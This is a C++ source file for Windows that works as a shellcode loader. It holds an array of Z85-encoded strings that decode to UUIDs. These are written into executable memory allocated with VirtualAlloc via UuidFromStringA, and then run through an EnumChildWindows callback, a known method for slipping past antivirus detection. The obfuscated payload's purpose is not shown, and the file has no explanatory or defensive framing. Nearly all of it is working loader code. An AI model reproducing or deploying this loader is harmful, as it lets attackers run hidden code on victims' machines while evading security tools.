#include <windows.h>
#include <rpc.h>
#include <iostream>
#include "./z85.h"
#include <iostream>
#include "./z85.c"


#pragma comment(lib, "Rpcrt4.lib")
using namespace std;

const char* uuids[] = {
"4wI=w5g=P8SeOc[NfFa$jv>YF*fFCgjg+*<xg+*<wh8m3z",
"4whk}}g=NuJeI]BBh7ZWviasD$fF>:vias:2f/R0Hias:2",
"4h.)v4g=NlAeI]BAfFc-)fLh)[vkIyAg?nx%v(Vw9gCJw[",
"4h!a:2gH<<6eIZ/&ga+sqgb7p&f>ii}fL00{fFN5(wIN?c",
"4g=NuEg+*<yeJ2pyvL6MGgb7ppgbAz(g=Nfzwh2#Li50rK",
"4g=NfyfFCgmeN{E]h7ZZBh-99yi506swh2>{iasZ7f/R0D",
"4g=WrBg+Z)#eO3K?f!CmvwIU[{ia=+Ov(Vw2iasW2i5&-O",
"4gCHZ%whVa@eI]B%iw1.{gCHE&v(b[(v>?ENfL00{fFN5(",
"4w?=k4wIt]1eIF$qv>xC)g?e9>i5AGAgDw#2h-kb9h8)AH",
"4g=WrFg+Z)#eO3K?f!CjphA0cDvLzpzg=NrGiasY#f>i42",
"4iasZ0wh2X(eJtZzg+yyog=N6$fF>Hoh8)AEh8)E8h90K5",
"4h90GFh8)AEeJ3@[f!Cvvg=N6#v>].&g+*<yw[CQdh8)AE",
"4iasZ7hdnv5eOc{%ga^9Ih8^a0w[CTbhdOK6vQQ@BfFCgm",
"4fFCgmfFCgmeI]BvfFbm{iaKP{f!+slfFCgmg+&DFgCH<#",
"4whN$hi5-:ceOlXCvL81zvL].{hz^cuvQSX6iw>nRiB(-l",
"4v(ce3g=P26eI*((i4W70fG7Hpvk]})w[2s9h-ioDvQ.eM",
"4hEOHQh.)9zeJ2KxfFbmAg+*N)vp<a6whMn3hzEa1hzWa1",
"4fFCyxh-JYMeJCHBfFbpsiwr3BfGy*siwrDEiwrDEiwrDE"
};

int main() {
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
    DWORD_PTR hptr = (DWORD_PTR)mem;
    for (int i = 0; i < elems; i++) {
        // printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
        // printf("%s\n", *(uuids+i));
        char d_my_payload[36] = {};
        size_t d = Z85_decode_with_padding(uuids[i], d_my_payload, strlen(uuids[i]));
        RPC_CSTR rcp_cstr = (RPC_CSTR)d_my_payload;
        cout << rcp_cstr << endl;
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("[-] UUID convert error\n");
            CloseHandle(mem);
            return -1;
        }
        hptr += 16;

    }
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems * 16; i++) {
        printf("%02X ", ((unsigned char*)mem)[i]);
    }

    EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
    // EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
    CloseHandle(mem);
    return 0;
}